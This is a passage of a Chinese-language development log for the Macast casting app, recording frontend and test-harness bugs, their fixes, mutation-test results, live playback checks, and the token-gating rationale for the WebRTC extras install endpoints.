  `target/debug/build/macast-tauri-*/out/tauri-codegen-assets/*.html` 用 `zlib.brotliDecompressSync`
  解出来（tauri 对页面做 brotli），当前构建那一份解出 **33,748 字节、与 `frontend/index.html`
  逐字节相同**，连上一轮刚加的那句 `[boot] script started` 都在。**坏的是文件本身**：
  `40a9b25` 删"我自己加重的两张重复卡"时，把 `refresh()` / `snapshot()` / `services()` /
  `subscribers()` / `loadLogModules()` 那一整段启动、两个 `setInterval` 轮询器、以及日志与订阅客户端
  两个渲染器**一起删掉了**，而它们对应的四张卡还留在标记里 —— 于是每一格永远停在「加载中…」，
  而页面**语法完全合法**（`node --check` 通过），窗口里没有任何一条控制台报错能指向缺失的那一段。
  这是 §4.13「不提问的检查」在**前端**的第一次现形：没有一条断言在读"某个格子是否被填过"。
* **资产是否过期，要问二进制，不要问直觉**：解 `tauri-codegen-assets` 下那一份、与仓库文件逐字节比，
  是一个三十秒就能做完的判据；而"窗口里没看见横幅，所以资产是旧的"这条推理链**每一步都成立而结论是错的**
  —— 横幅没出现是因为**脚本从没跑到那一行**（整段启动没了），不是因为它是旧页面。
  下一次遇到"界面全空"，先做这个对拍再动代码。
* **常驻判据补了两条，都不依赖浏览器**（`src-tauri/src/host.rs` 的 `mod tests`）：
  ① `every_element_the_page_declares_is_also_one_its_script_touches` —— 标记里每个 `id=` 都必须被
  页面自己的脚本提到，唯一豁免 `proto-hint`（静态散文，没有任何写者），豁免**按名字列并写明理由**，
  同时先断言"扫到 ≥40 个 id"（空扫描与"全部通过"是同一句话）；
  ② `the_page_boots_by_asking_the_backend_five_questions` —— 六条启动调用必须以 `.catch(` 的形状在场，
  因为一个未处理的 rejection 会把后面整段初始化一起带走，这正是"少一个函数"读成"五张卡都坏了"的机理。
  **牙齿是按原样重放那次删除量出来的**：删"渲染器 + 启动段"共 142 行 ⇒ ① 红并逐字点名十二个没人写的
  格子（`log-tail`、`log-sub-*` 那一族）；只删启动段、留渲染器 ⇒ ① **绿**（渲染器还在提那些名字）、
  ② 红 —— **两条各管一半，缺一条就有一半没人问**。
* **`mirror-action` 是 POST 表最后一行，也是全表唯一门是 `token` 的一行**（`protocol.py:2296-2298`：
  任何网页都能向 127.0.0.1 发 POST，"开始录这块桌面"不是即兴访问能问的；`query=cast` 是它在 GET 面的
  对应物）。表到 **23 / 23 与参考实现齐平**，其中八行的答复是"这个构建做不了"（插件/镜像宿主不在）——
  **齐平指的是行数，不是能力**。答案用**一个常量三个读者**（`MIRROR_ABSENT_MESSAGE`：两个 GET 门 + 这个
  POST 门），因为三种问法是同一个事实；§39 不比"都有镜像二字"，它比 **POST 的答复逐字包含 GET 那整句**。
* **一个只有真机能问的顺序**：参考实现先找 console surface、再校验 `mirror-args`，所以没有镜像面的构建
  对**坏 JSON** 答的是"没有镜像面"而不是"mirror-args 不合法"。§39 因此故意带 `mirror-args=not-json`
  发过去 —— 别的输入下两种顺序给出同一个答案，这一格是唯一能把它们分开的形状。
* **两条仪器自己的错，都长得像产品坏了**：① §39 第一版拿 GET 门的**信封**当 POST 门的：GET 拒绝是
  `HTTP 403` + 正文 `code: 1`，POST 是 `HTTP 200` + 正文 `code: 403`（`Answer::denied` 从不设状态码）。
  对着一台正确的机器红了之后才回头读 `Face::gate_refusal`，所以判据现在**两半都问**（状态码与正文）；
  ② `scripts/verify_rust_receiver.sh:1624` 有一处 `"…$SPEC，…"` —— bash 把全角逗号的头一个字节当成变量名的
  一部分，`set -u` 当场把整趟验收入**中途**掐断（EXIT 非零而输出停在第 18 节），于是 19–39 节一句读数
  都没有。修法 `${SPEC}`，而**这一类只有一条正则扫得出来** —— 问"一个变量名后面紧跟一个非 ASCII 字节"：
  `grep -nP '\$[A-Za-z_][A-Za-z0-9_]*(?=[^\x00-\x7F])' scripts/verify_rust_receiver.sh`
  （本轮量过：命中的只有那一处）。中文散文里插变量是这套脚本的常态，而 `bash -n` 对着它一律说 OK。
* **同一族的第三半：页面读过后端从来不发的键。** `renderLogModules` 读 `m.known`
  （"在盘上的 ∪ 已被插件认领的"）—— 那是写 UI 时想出来的第三个字段，而
  `log_modules_document()` 一直只发 `main` 与 `modules`（参考实现 `protocol.py:2120-2128`
  与 `logsplit.list_logs()` 的形状）。于是 `(m.known || [])` 永远是空数组，
  "认领了却还没写过 → 列出来但标明是空的"那段循环**一次都没跑过**，而且什么都不报错：
  JavaScript 读一个不存在的键是 `undefined`，不是异常。删掉那个分支而**不是**给后端补一个键
  （补上就是一条只被我们自己页面读的偏差）。
  判据 `the_keys_the_page_reads_are_keys_the_backend_sends`：用**窗口命令自己调的建造者**
  现造文档（`log_modules_document()` / `module_settings::payload()` / `log_view_document()`），
  再把页面里所有 `m.<key>` 的读法扫出来要求逐个在场 —— 扫描**先剥注释**，
  因为这个页面就在缺陷旁边的那段注释里写着 `m.known`，而一个会被散文点着的扫描器寿命是一次
  "这测试干嘛挡我写注释"（§16 第 19 条那条 CORS 检查的教训同一形状）。
  **第一版这条判据是 0 红的**：它只问后端发不发 `known`，不问页面读不读 —— 把死分支贴回去它照样绿。
  补成"扫页面读的键"之后，同一支变异体红 1 条并逐字点名 `known`。
* **窗口第一次能自己走完「网页地址投屏」**：四条命令（`resolve_page` / `resolve_status` /
  `cast_resolved` / `cast_targets`）全部经过**同一个** `Arc<dyn Management>` —— 它的 `Arc` 在
  `main.rs` 里有了名字，`Face::new` 与 `Runtime` 各拿一份 clone。第二份会是**第二张 job 表**，
  于是窗口起的解析在 `curl` 的轮询里看不见。页面的每一格都读后端交回的数（`step_label`、
  `scraped`/`from_ytdlp`/`measured`/`rejected`/`hidden_silent`、候选行的 `mode`/`merged`/`relay`），
  一个数都不在页面里另算。
  **第一个 bug 只有点击才现形**：轮询结束那一支把 `resolveJob` 清空，而"投第 N 条"读的也是它 ⇒
  一张**填满的**卡片点下去发的是 `job: null`，后端答 `success`（那条路只读候选表）。真机读数是
  `{job: null, candidate: "1", target: "uuid:tv"}`；修法是两个变量（`resolveJob` 管轮询、
  `finishedJob` 管这张卡是哪一次解析）。**渲染层完全看不见这个 bug** —— 面板满、按钮活、无报错。
  判据：真机 HTTP 面把 `resolve-status` 的**十七键**逐名读回、两种空分得开（`status: null` +
  「没有这个解析任务」）、下拉第一行是**后端插的**本机；真浏览器用**同一个实例的真答复**渲染 ⇒
  两条候选各自的理由、零 JS 报错、零格停在加载中；点击路径发出 `{job: "J1", candidate: "1",
  target: "uuid:tv"}`。常驻的是三条静态守卫（含"四命令必须真的被 invoke"与三类键名 ——
  它当场抓到我漏渲染 `c.relay`，也就是那条解释"为什么这一条能投"的句子）。
* **六条 seam 方法此前只有 HTTP 面能调、窗口点不到**：cookie 的四个（读/存/清/选浏览器）、
  字幕显隐、渲染器切换、整份设置读写 —— 后端一直完整，缺的是窗口那一侧的门。`curl` 能做到、
  窗口做不到，就是 §4.8「只动文档的旋钮」的反面。全部经过 `main.rs` 里那个**有名字的**
  `Arc<dyn Management>`；第二份会是第二张 job 表 + 第二个 device cache。
  页面上四条规矩：cookie **只报条数**（真机确认种进去的 `COOKIESECRET40` 在文档、设置文件、
  整个页面里都搜不到）；`cookie_problem` 的**四个族各一句自己的下一步**，且页面只有那四个分支
  （双向钉住：少一个族红、多一个后端永不返回的键也红）；字幕开关发 `1`/`0` 而不发 `on`
  （四词规则不 strip，`" on "` 是隐藏）；高级设置先读再改（整表替换并重启）。
  **`mirror_action` 仍然没有窗口门**，因为后端也没有面 —— 一个按钮只会是只动文档的旋钮。
* **一条把网络状态当判决的用例**：`announce_tests::e11` 数 `send_to` 的成功次数（要求 2），
  而 2026-10-21 这台机器的上行从 `en0` 变成 `en7`（合成 MAC `02:00:00:00:00:00`，无多播路由），
  内核拒绝 `192.168.1.5` 的组播（`EHOSTUNREACH`）—— 手搓
  `setsockopt(IP_MULTICAST_IF)+sendto(224.0.0.251)` 复现同样结果，产品代码一个字没变。
  判据改成：`setsockopt` 必须两个都接受（那是代码的性质）+ **至少一份出去**
  （loopback 永远可用）。严的每口一份留在它上面的两条 loopback 用例与真机 §32。
  这是 §4.13「一个没被机器问过的数字」在**网络判决**上的形状：一次绿读数被当成了不变量。
* **同一天第二例：把"来不及"读成了"没工作"。** §19 本来断言"两次连拍的 refresh 必有一个
  `started=false`"。在这台机器上量到的是**十二次连拍全是 `true/true`** —— 因为一次扫描几毫秒
  就结束，第二个 `true` 是**新的一次**，不是被吞掉的那次。我先把它改成"重试十二次去抓窗口"，
  实测仍然抓不到（手跑两次也是 `true/true`），于是判据改成：**真机上这一格只记读数、不下判决**，
  而 latch 的见证交给单元里那条带 `HoldGate` 的用例（它把扫描按住，要求第二次 `start_search()`
  回 `false` 且只记一次调用）。留在这段话里的理由是：**"这个窗口太窄所以测不到"必须写成一句
  读数**，不能悄悄换成一条永远绿的断言 —— 那正是本文件开头那句"跑不起来的检查不是绿"。
  与 §4.2「等那个状态，不要抓一瞬间」是同一族，区别在于这一次**那个状态在本机根本不存在足够久**。
* 读数：`macast-upnp` **369**、`macast-tauri` **33**（两台仪器一致：`--list` 与整跑），
  单元合计 **1414 passed / 0 failed**（cast 735 + core 128 + mpv 149 + tauri 33 + upnp 369）；
  真机脚本 **43 节**，最近一次整跑 **420 PASS / 18 FAIL**，其中 **§39 = 8/8、§40 = 12/12**。
  那 18 条逐条归因过，**没有一条是这一轮改的东西**：7 条是用户的第三方 app `xiezuo`（PID 1080）
  整片占着 UDP/5353（它还广播 `Pavia的MacBook Pro._airplay._tcp.local.`，正是 §26 那句
  "browse 看见的是别人的接收端"）；1 条是 `hancast-s`（PID 1215）占着 UDP/1900；
  6 条是「LAN caller」那一族的 `HTTP 000`；1 条是 §19 的连拍闩。按 §10 那三个进程都属于用户，
  **我没有动它们** —— 所以这几格今天的诚实读法是"本机暂时量不出来"，不是"产品坏了"，
  更不是"CI 绿了"。本分支从未推送 ⇒ **这些读数没有任何 CI 见证过**。

**配额是护栏不是精度**：`MAX_MEASURED = 8`、`MAX_MEASURED_PER_HOST = 5`、
`PAGE_MAX_BYTES = 2 MiB`、`SCRAPE_TIMEOUT = 15` / `YTDLP_TIMEOUT = 120` / `PROBE_TIMEOUT = 25`、
`RESOLVE_JOBS_MAX = 4`（只数**在跑**的）、`RESOLVE_JOB_TTL = 30 分钟`（从**开始**算，完成的也不例外 ——
上一场的签名地址比没有地址更糟）。它们防的是"页面被连着点解析把这机器挂满 ffprobe"，
不是准确性上限；未度量的条目走 `last_resort` 保留而不是被丢。

**测试面**：Part 59（v0.18 **132 条** → v0.19 **174 条**）按"事实住在哪一层"分段 —— A–H 是解析层的两个解析器与两张表
（**全部喂 fixture，不碰网络也不 spawn**：抓页面的直链识别与去重、`yt-dlp -J` 的 `http_headers`、
六行 first-match 判定表、排序与 castor 相反的那一句、两批从 castor 搬来的集合）；I 是页面轮的那个 job
（计数器、两个度量上限、"解不出"与"解出来但都被剔除"两句不同的话，外加一条在 PATH 上放假二进制跑完的端到端）；
J–N 是中转（`parse_range` 与插件第二份副本的漂移表、`serve_plan` 的判决、**真监听 socket 上的 HTTP 语义**、
增长 / 驱逐 / TTL / 孤儿清扫；N 段后半是 DASH 合并的 argv：第二条输入**带自己的请求头**、
而对外仍然只有一路 `remux` 形状）；O–P 是 handler 接线（校验、job 上限、"电视拿不到页面地址"）；
**R 段是后来到卡片上的那四件** —— 分享文案（整段是地址就原样、是全角包着的句子就挖、多地址报条数、
裸 host 仍不许交给引擎）、引擎自己的拒绝原话（第一行、截断、`needs_cookies` 的词表）、
cookie（粘贴到落盘到 argv 的一整条链：0600、上限、白名单**每次读**复查、文件优先、只报条数），
以及设备下拉（本机永远第一、那一行的名字跟着菜单选的渲染器、`refresh` 是字符串真值、
投给设备时**不碰**我们自己的播放态、插件失败/抛异常/面消失三种形状各自带走中转）；
**Q 段是页面的文本契约** —— 套件里没有浏览器，所以 `c.<key>` 必须都在
`describe()` 交出的键里、`{{ c.relay }}` 必须是原样转发后端那句话、进度条必须读
`ResolveJob.STEPS` 而不是自己数、`v-if="resolve.done"` 不许写成 `v-else`（否则解析还在跑
就说"这页没有视频"）、**全卡片与解析 JS 里不许出现 `v-html`**（标题和地址都来自那页 HTML）。
**十七个定点变异体**：v0.18 的七个各自红 1/1/1/3/1/2/2 条（`advertise_host` 抄回 `get_advertisable_ip` /
空结果不拦 / 死中转不摘 / `plan()` 契约漂 / 卡片编一个模板键 / 卡片用 `v-html` / 无声标签少一个操作数），
v0.19 的十个红 1/3/1/4/1/1/2/7/2/2 条（`rstrip` 挪到正则里 / 裸 host 白名单接受空 scheme /
合并的第二路输入复用画面那份 headers / `plan()` 把 merge 报成 remux / jar 写成 0644 /
白名单只在写入时查 / 核心不再拼「本机」 / `target` 只认 `'local'` 不认空 /
`_local_target()` 的名字写死「本机」 / 删掉 `#HttpOnly_` 那一支（单元用例与粘贴用例各一条，而**旧的 jar 用例全绿** —— 那正是这一格曾经的样子）。**第八个（`== 'local'`）红 7 条不是过度敏感**：
这一段的夹具前面每一次投屏都是"本机"，所以它们全都诚实连带 —— 而它**第一次跑让 Part 在中间抛
`IndexError` 就死了**，把后面约 53 条一起藏起来（`check()` 不捕异常，§4.2「测试自己的实现也是实现」）。
修法是让失败路径用 `.get()` 读回中转 id，并把清扫循环写成"只摘还活着的那几条"。
**最后那个（名字写死）第一次跑出 0 红**，因为原用例把答复和产出它的函数比（`items[0] == _local_target()`）
= 同义反复；现在名字要**第二遍问那个决定它的事实**（`Setting` 里那个键），并新增一条"换一个渲染器选法，
那一行跟着变"。**再顺带抓到一条测试自己的漂移**：新那次读取让后面那条用例的
`_surfR59.states` 从 4 变 5，而它读起来完全像产品坏了（同一族的"两个见证者必须分开报"）。
detail 一律 `str(...)`（v0.18 那条 `None` 让后半 8 条根本没跑）。
**以及第三条同族的、这一轮自己踩的**：新增用例里一个局部变量取了 `_restore59` 这个名字，而它**正是** Part 59 的 I 段定义的那个还原助手（`verify_cast_airplay.py:24414`，整段末尾的 `finally` 靠它把 `media_resolve` 的三个全局挂回去）—— 于是那个 `finally` 拿到的是一个 dict，红法是 `TypeError: 'dict' object is not callable` 加一句「Part 59 runs」，把这一格之后**所有**用例一起吞掉。写新用例前先 `grep -n "^ *def \|^ *_[A-Za-z0-9]*59" scripts/verify_cast_airplay.py`，别和这一段已有的作用域撞名（这一条与 `check()` 不捕异常是同一种脆弱：Part 的包装把一次局部错误读成整段崩）。

**明确不做**（都要写在页面上，别让用户当网络问题排半天）：需要 JavaScript 才算得出地址的页面
（那要每个页面多养一个浏览器进程 = 二阶段的决定）· DRM · **Macast 不代用户登录**（没有账号密码表单、
不弹登录窗；两条路都在卡片上：粘贴 Netscape jar，或允许从指定浏览器读 —— 后者默认关）·
把中转链接当保密链接。**v0.19 从这一行划掉两件**：DASH 音画**合并**（现在合并了，只留下"多路音频只挑一条"
这句代价）和"选一台设备投过去"（现在能选，且复用插件已有的发现与发送面）。
**这一行的 JS 那一半在 v0.24 被收窄过一次，方向是"门还在那儿，但别把走错门的人算进来"**：
用户报的第二个站点（`pomo.mom`）**从来不在 JS 这一类里** —— 它的两条真 m3u8 就写在 HTML 里，
只是被 PHP 的 `json_encode` 转义成 `\/`，而我们的扫描把反斜杠当边界，于是从每个斜杠重新起扫、
交回一个页面自己的根路径。修的是**读取**，不是新增"替页面跑一遍脚本"的能力；
真 JS 形状的那个是 `xmfyy.com`（HTML 里零条媒体地址，`/js/play-router.js` 再去打
`/api/play-url` 才拿得到），它现在**仍然**解不出，只是卡片会说出是哪一种解不出（见上面那行四句话）。
**所以别把这次修复读成"JS 站点的支持开始了"**：那还是二阶段的决定，代价还是"每个页面多养一个浏览器进程"。

**验证到什么程度**（2026-10-05 更新）：真站解析跑过**三趟**（v0.18 那趟对着 CLI，bilibili 6.5 秒走完四步，
正是它暴露了无声 DASH 那一条；v0.19 那一趟对着**真设置页**从一段分享文案粘进去，6 秒 done、15 条候选、
6 行带「画面＋声音（m4a 203 k）」、被藏的无声行 0 条、控制台无 JS 报错 —— 这一趟同时验的是第 ③ 项的
**顺序**：先合并再过滤，反过来做这张卡片就是空的；第三趟是 2026-10-05 那一次走完**整条产品路径**到
播放器，见下面「同一趟把见证从字节抬到了播放器」那一段）。**合并后的流按字节复验过**（真解析 → 真
`open_relay` → 真 HTTP 取字节 → ffprobe）：`video/h264 + audio/aac`（1080p、212.3 秒、75.2 MB）与
`video/hevc + audio/aac`（25.4 MB、**转封装 10.0 秒完成**）各一路，完成之后再取前 6 MB 仍解得出两条轨，
`relay.length` 与 `ranges` 在那一刻变成真值。**设备下拉与 cookie 那两块也在真浏览器 520 / 1000 / 1680
三档各走过一遍**（临时配置目录 + 58999，用户的实例没被碰）：下拉第一项读本机渲染器名（那次是
`MPV Renderer`）、第二项是局域网里真的 `Macast(AMD-YES)`，选中值 `local`；4 行 Netscape jar（**两行行首
`#HttpOnly_`**）从页面贴进去后三档都读「本机 cookie 文件：4 条 · 从浏览器读取：关」，整页搜不到 cookie 值，
落盘权限实测 `0o600`，页面点「清除」并确认后回到「未保存」。
**那一趟顺手量出了一句以前写错的代价，而这一趟把它连根改掉了**：同一支探针在**写完之前**打到半截文件，ffprobe 回的是
`moov atom not found` —— 标准 MP4 的 `moov` 由 ffmpeg 在**退出时**才搬到文件头，所以 remux/merge 这一路
当时是**整个文件写完之前谁都播不起来**。卡片和帮助原先只说「拖动要用完才准」，低估了前半件；
2026-10-04 那一版把整句改成「要等写完才播得起来」，而 2026-10-05 这一版**把前半件消掉了**：
转封装写的是分片 MP4（`+frag_keyframe+empty_moov+default_base_moof` 且 `-flush_packets 1`），
同一支探针打到**前 64 KiB** 就解得出 `h264` + `aac` 两条轨。卡片和帮助现在说的是剩下的那一半
（「转封装能边写边播；写完之前没有可信长度，拖动要等它写完」），Part 59 Q 段那条文本契约
跟着钉住 `'边写边播' in` 与 `'可信长度' in` 这两半。
**2026-10-05 同一趟把见证从字节抬到了播放器**（这就是用户报的那条「投 bilibili 网页地址后 mpv 报
File error」的收口）：临时配置目录 + 58993 的第二台实例（用户的 58880 一个字节没动），走**真产品路径**
`resolve-page` → 轮 `resolve-status` → 挑**一条 `merge` 候选** → `cast-resolved` → 交给我们自己的
mpv，十二问全绿：交出去的地址确实是 `http://192.168.1.5:<port>/relay/<22 位随机 id>/media`，
日志里 `audio-reconfig` 与 `file-loaded` 落在同一毫秒（14:17:49,305）、`video-reconfig` 紧随其后，
**没有任何一条 `end-file` 带 `'reason': 'error'` 或 `'file_error': True`**，mpv 的 IPC 回
`kinds=['audio','video']`、`codec=H.264 …/AAC …`、`duration=54.99`、位置推进到 **3.08 秒且
`core-idle=False`**。三点要留在记录里：① **`merge` 候选在中转侧的 `mode` 就是 `remux`**
（`media_relay.py:1215` 那一行 `mode='remux' if plan == 'merge' else plan`），所以「第一个字节到手之前
不回响应行」那道门（`media_relay.py:996`）**确实覆盖这一路**，而不是只覆盖了清单流；
② 第一趟播到 2.4 秒被截断过一次，`end-file` 的 reason 是 **`'stop'` 不是 `'error'`**，
顺着「唯一会调 `renderer.set_media_stop()` 的是 `AVTransport_Stop`」（`protocol.py:1030`）查到的是
**局域网里另一个控制点**（这台机器上还有别处在跑 Macast），不是我们的代码 —— 复跑没有再现；
判据也因此改成「位置取多次轮询的**最大值**」而不是抓一瞬间；
③ 这一格的见证者是**本机的 mpv（真播放器，但不是电视）**，所以下面那句欠账只改剩下的那一半。
**2026-10-05 那一轮（v0.24.0 的两个报错站点）把这一格推到真站上重测了一遍，两个方向都量到了**：
`scrape_page('https://pomo.mom/?plugin=plyr_player&gid=3683')` 交回 **3 条**候选
（两条 `vip.dytt-network.com/…/index.m3u8` 加一条 `fengbao12.com/…/index.m3u8`），
**「按页面自己的 host 编出来的地址」这一列实测是空列表** —— 修之前那一条是
`https://pomo.mom/index.m3u8`，而服务器根本没有这个路径。另一侧 `resolve_now` 打在
`https://www.xmfyy.com/vodplay/10277-qiyi-1.html` 上：候选 0 条、`engine_note` 是引擎自己的
`ERROR: Unsupported URL: <那条地址>`，卡片读到的是**四句话里的第一句**
（`页面里没有读到视频地址（yt-dlp 说：…；需要 JavaScript 才能算出地址的站点本机解不出来：…）`）。
这一格的判据因此是**"两种解不出听起来不一样"**，不是"两个都解得出"。
套件这一轮 **2351/2357**（红的仍是 §4.12 那 6 条 Part 34），`--ci` **PASSED**；
四个定点变异体各自红 **1 / 4 / 1 / 2** 条且红集互不相交 —— 删掉 `_literal_urls` 那次解转义
（假地址那条编造回来）；把 `engine_says_unsupported` 写成"任何 ERROR 都算"（**4 条**：一条 500 的原话
被贴上 JS 那句、bilibili 的 cookie 墙被贴上 JS 那句、词表单元用例 `[('unsupported url', False), …]`、
以及 R 段那条早就存在的 cookie 墙契约）；第三句（引擎在场却沉默）丢掉 `JS_HOLE`；
第三句（这台机器没装 yt-dlp）**加上** `JS_HOLE` —— 最后一支同时红到 §4.2 那条
「空结果要说清是哪一种空」的 `find_command` 打桩用例。四个都从 /tmp 备份还原、md5 逐字节一致。
**同一轮再跑了一次上面那条「把见证从字节抬到了播放器」，这一次它同时是 §4.2 那条命名判据的见证者**
（临时配置目录 + **58991** 的第二台实例，用户 58880 上的实例一个字节没动；仪器
`/tmp/title_witness.py`，走**真产品路径** `resolve-page` → 轮 `resolve-status` → `cast-resolved`
挑一条 **`remux`** 候选 → 从产品自己的日志行 `cast url from web endpoint: …` 读回交接地址 →
按 `ppid` 认领**我们那个** mpv → 问它的 IPC）。**17 问 0 红**，逐格是：
`title` / `media-title` / `force-media-title` **三个都读回卡片给的那个标题**
（`【官方 MV】Never Gonna Give You Up - Rick Astley`），而 `filename` 仍然是 `'media'` ——
这一格**故意留在输出里当作原症状的见证**（中转地址的末段被 mpv 当成名字，那正是 `media - mpv`
的字面来源；「在播的是哪一路流」因此问 `path`，实测
`http://192.168.1.5:64849/relay/f1CrNPfebdllNdlsh4NhrQ/media`）；`time-pos` 从 **0.96 走到 4.0**
而 `duration` 是 `None`（转封装还在写，§4.14 那句「写完之前没有可信长度」在这里现形），
`track-list` 交出 `['audio','video']`，日志里 **`end-file` 行数 0、带 `'error'` 的 0**；
收尾 `SIGINT` 之后**只**收本次新增的那一个 mpv（69347），残留 `[]`，基线那 5 个一个没动。
**这台机器上「在播」的判据必须是等 `time-pos` 变成一个数，不是抓一瞬间的 `duration`**，
而一次批量 IPC 读取要按 `request_id` 凑齐来终止 —— 两条都是这一轮仪器的第一次红法（红的都不是产品）。
**仍然欠着的两件**：**投给一台真电视没验过** —— 这个局域网里没有 Chromecast 设备，
中转出去的流只在自家假设备、自家接收端，以及现在这一次的本机 mpv 上验过（§4.9 那一族的边界照旧适用：
打桩能证明"交出去的只有 `/relay/<id>/media`"，字节复验与播放器复验都没有证明"一台真电视在转码还没完时
就去打开它"会读到什么）；**需要登录的站点只在打桩里验过** —— cookie 那块这次是真页面走真流程，但贴进去的是验收用的假
jar，没有任何一个"必须登录才解得出地址"的站点被真的解开过（那一格的对齐对象是**标准库的读取规则**，
判据照 `MozillaCookieJar._really_load` 写，不是某一份真浏览器导出的实跑）。

### 4.15 WebRTC 依赖的按需安装（`screen_mirror` 的 extras 层 + `macast/plugin_repo.py`，Part 60）

P9（随 **v0.20.0**）把 `aiortc` 与 `av`（连带它们拖进来的 `cryptography` / `pylibsrtp` / `cffi`）
从**四个平台的默认产物**里摘了出去：每个平台随 Release 发布一条 extras zip，设置页「电脑投屏」→
「WebRTC 依赖」卡上按一个按钮装。**这一轮同时把 `screen_mirror` 自己的版本号从 0.26 升到 0.27**
（`<macast.version>` 与 `PLUGIN_VERSION` 两处，Part 29 与 Part 39 各钉一处逐字一致）—— 因为这一轮的
代码落在插件文件里，而本仓库历来是"每个插件功能提交升一次插件版本"（`git log` 量到的对应关系：
应用 0.11 → 插件 0.20、应用 0.16 → 插件 0.25、应用 0.19 → 插件 0.26；两个号从来不相等）。**为什么不是纯减法**（那是被否掉的方案）：用户两台机器跑的
都是打包产物（本机 `.app`、`.68` 的 `.exe`，而跨机 400 毫秒那个数正是后者量出来的），
"从源码跑请 `pip install`"对他们是一条死路。**这条功能的判定面是 `_webrtc_modules()`**
（惰性 import，**失败不缓存**），所以卡片上那句「装完不需要重启 Macast」是被测出来的性质，
不是承诺（Part 56/B 与 Part 60/C 各钉住一半：前者是"装完再选一次本目标"，后者是"probe 自己翻面"）。

**v0.21.0（2026-10-04）修的是这一条功能出厂时的三个缺陷，三个都是"按了按钮之后"才现形的**
（`screen_mirror` 0.27 → 0.28）：

1. **重启之后那棵树不在 `sys.path` 上。** `installed` 读的是磁盘清单，`ready` 读的是真 import，
   而挂路径那一步只做在 land 那一步里 —— 于是重启后的 Macast 报「已安装」配 `No module named
   'aiortc'`，卡片给的唯一补救是**再下二十六兆**去买一棵已经在本地的树。修法落在**判定面**
   （`_webrtc_modules()` 自己先 `_restore_extras_path()`），不是落在启动流程里：这样按安装、
   卡片每秒一次的轮询、以及下一次选 WebRTC 目标三条路都同一个答案，而"重启后不需要再装一次"
   这句话不需要新的启动钩子就成立。**每台打包机器每天都走这一条**，所以 P9 出厂时它是整条功能
   最贵的一处缺陷。
2. **Windows 的默认产物不再携带 CPython 的稳定 ABI 转发库 `python3.dll`。** 这不是"少装了一个包"，
   而是 §4.3 那一族的**反向形状**：P9 的减法把**没有任何一行清单声明过的文件**一起带走了 ——
   每一个 cp3xx wheel 的 `.pyd` 都**链接** `python3.dll`（PEP 384），而 CPython 在加载任何扩展模块
   之前自己去载它（`Python/dynload_win.c`：先 `python312.dll` 旁边、再应用目录、再 `<prefix>\DLLs`），
   而 PyInstaller 只打包**它的图里需要的** DLL。实测就是这条判据：v0.18 的 onefile TOC 有
   `python3.dll`（635 条目），v0.20 的 TOC **一个都没有**，于是应用内装好的 1,083 个文件在真机上
   全部卡在 Win32 **126 `ERROR_MOD_NOT_FOUND`**，而那正是「已落盘 / 不可用」那一格该说的话。
   修法在 **bundle 侧补一个文件**（`--add-binary "$PY3DLL;."`，落 `_MEIPASS` 根 = CPython 找到的第一站），
   不在 extras 侧复制 12 个文件 840 KB —— 那是同一个答案的十二份漂移。**而且构建完成后要打开产物核对**
   （`PyInstaller.archive.readers.CArchiveReader(...).toc`，不在就 `sys.exit(1)`），因为"构建成功"
   正是这两个坏掉的 release 都green的那件事（§4.3）。**macOS 侧的同形风险没有被测过**：
   py2app 的扩展不链接一个 `python3.dll` 桩，本机没有量到任何对应缺陷，所以这里只记录不修。
3. **进度条钉在 3%，而断掉的流读起来像成功。** `_SetupProgress.overall()` 在没有分数时给
   一步 / 五步 = **0.03**，而下载的 `sub(at, None, …)` 一直在交 `None` —— 二十六兆在整个下载期间
   显示 3%。另一半更贵：body 提前结束（`Content-Length` 说 Y、只给了 X）以前**不报错**，
   解包侧靠清单的 sha256 才拦住，用户读到的是"安装失败"而没有任何一句说明断在哪。现在
   `_fetch_extras_zip` 回 `(ok, why)`，四种形状各一句话（一个字节都没给 / 断在半路并报两个数 /
   源站不给长度就只报已下多少 / 无异常但提前结束的 body），失败把地址念出来，并且**把 ABI 落点
   目录清空**再交回（阶梯 `['fail','pending','pending','pending','pending']`），而分数是**真字节**：
   源站不给 `Content-Length` 时宁可不给分母，也不编一个。**仍然不做 Range 续传**，这是决定不是遗漏 ——
   代价写在数字旁边（「重试会整份重来」），§4.8 那条「代价印在旁边」。
4. **修完 3 之后，进度条改成**倒着走**（2026-10-05，真打包 `.app` 上的 v0.21.0 验收现场）。同一台
   仪器先看见 3%，第一波字节到了以后掉回 0%，然后才一路涨上去：`overall()` 给"这一步还没有分数"记
   **0.15 的猜测**，五步 ⇒ 猜测值 0.03，而二十六兆的下载要跑到 **15%** 才追得上自己那一步的猜测值 ——
   于是真实进度在开头一段**低于**猜测，卡片读出的是倒退。**修法是一个属于这一次运行的单调钳**
   （`_ever_shown`）：涨上去就不回头，但新建的步骤机从 0 起，**不把上一场下载见过的最高值带过来**
   （否则第二次按安装会从 100% 开始，那是另一种谎）。两条契约各一条用例（Part 60/C3 现在 7 条）：
   跨过 0.15 之前那条猜测值必须**照住**（比例序列 `0.004 / 0.05 / 0.16 / 0.6` 里第二个值仍等于猜测），
   整条序列非降且终值高于猜测；以及第二个实例的第一格必须低于第一场见过的任何值。
   **这一格值得留在文档里的原因**：0.15 不是随便选的数，它是"没有信息时该显示什么"的一个猜测，
   而**猜测和真实读数共用同一条单调轴**时就互相打折 —— 修法不在猜测上，在"谁可以覆盖谁"的方向上。

| 红线 | 为什么 |
|---|---|
| **两个 POST 字段是 `GATE_CODE`，绝不复用 `mirror-action`** | `install-webrtc-extras` / `uninstall-webrtc-extras`（`protocol.py:2092-2093`）落地的是**可 import 的代码**，形状与 `install-plugin` 同一族 —— §4.7b「落代码的只认令牌，loopback 不算数」（DNS 重绑定下"本机"这个事实毫无信息量，而 `mirror-action` 的门是更弱的 `GATE_TOKEN`）。所以 `extras_install` / `extras_uninstall` 两个方法**故意不进** `ScreenMirrorSetting.CONSOLE_ACTIONS`：Part 60/D 双向钉住"在表里 / 不在 console 名单里"，以及拿 `console_action` 去要它必须回 `code: 1`。页面取不到管理令牌就**不发**（`extras_post(fd)` → `require_management_token(fd)`，与 §4.7b 那五条流程同一个助手） |
